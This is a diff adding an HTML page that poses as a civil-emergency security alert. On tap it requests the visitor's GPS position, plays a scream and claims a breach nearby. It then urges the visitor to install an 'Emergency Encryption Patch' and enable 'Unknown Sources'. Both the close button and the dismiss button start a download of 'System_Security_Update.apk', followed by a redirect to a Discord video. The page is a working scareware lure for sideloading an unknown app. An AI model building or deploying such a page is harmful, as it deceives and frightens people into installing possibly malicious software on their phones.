@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SYSTEM SECURITY AUDIT</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'Arial Black', sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        #eas-ui { display: none; width: 85%; border: 12px solid #ff0000; background: #1a0000; padding: 25px; text-align: center; box-shadow: 0 0 80px #f00; position: relative; }
+        h1 { color: #fff; background: #ff0000; font-size: 1.8em; margin: 0; padding: 10px; }
+        .close-x { position: absolute; top: -15px; right: -15px; width: 45px; height: 45px; background: #444; color: #fff; border-radius: 50%; line-height: 45px; font-size: 28px; cursor: pointer; border: 2px solid #fff; font-weight: bold; }
+        .status-box { color: #0f0; font-family: monospace; margin: 15px 0; border: 1px solid #0f0; padding: 10px; font-size: 0.8em; }
+        #overlay { color: #333; font-size: 0.9em; cursor: pointer; letter-spacing: 2px; }
+        .swipe-zone { margin-top: 20px; padding: 15px; border: 2px solid #fff; cursor: pointer; background: rgba(255,255,255,0.1); }
+    </style>
+</head>
+<body onclick="initiate()">
+
+    <div id="overlay">AUTHENTICATING SESSION... [TAP TO BEGIN]</div>
+
+    <div id="eas-ui">
+        <div class="close-x" onclick="executePayload()">×</div>
+        <h1>CIVIL EMERGENCY</h1>
+        <div class="status-box" id="gps-log">SEARCHING FOR GPS...<br>LOCAL AUDIT IN PROGRESS</div>
+        <p>A security breach was detected in your area. You must install the <strong>Emergency Encryption Patch</strong> to secure your device.</p>
+        
+        <p style="color: #ff0; font-size: 0.8em;">NOTE: You must allow 'Unknown Sources' if prompted to finish the sync.</p>
+        
+        <div class="swipe-zone" onclick="executePayload()">
+            <strong>SWIPE TO DISMISS & UPDATE</strong>
+        </div>
+    </div>
+
+    <audio id="scream">
+        <source src="https://www.myinstants.com/media/sounds/bitch-scream.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        function initiate() {
+            // 1. Trigger GPS Request
+            navigator.geolocation.getCurrentPosition(function(position) {
+                document.getElementById('gps-log').innerHTML = "GPS LOCKED: " + position.coords.latitude + ", " + position.coords.longitude + "<br>AUDIT STATUS: UPLOADING...";
+            }, function(error) {
+                document.getElementById('gps-log').innerHTML = "GPS ACCESS DENIED<br>PROTOCOL: MANUAL OVERRIDE REQUIRED";
+            });
+
+            // 2. Play the Scream
+            var audio = document.getElementById('scream');
+            audio.play();
+
+            // 3. Show the UI
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('eas-ui').style.display = 'block';
+        }
+
+        function executePayload() {
+            // 4. Download APK from the same GitHub Repo
+            window.location.href = "System_Security_Update.apk";
+
+            // 5. Redirect to Discord Video after 3 seconds
+            setTimeout(function() {
+                window.location.href = "https://cdn.discordapp.com/attachments/1497451162637434902/1497451227561328780/grok_video_2026-04-24-23-13-08.mp4?ex=69ed91a1&is=69ec4021&hm=137aadda4d2637a41ff05cb895c85dfbcf873764193bfe04e8fd2c7718d28a02&";
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
+
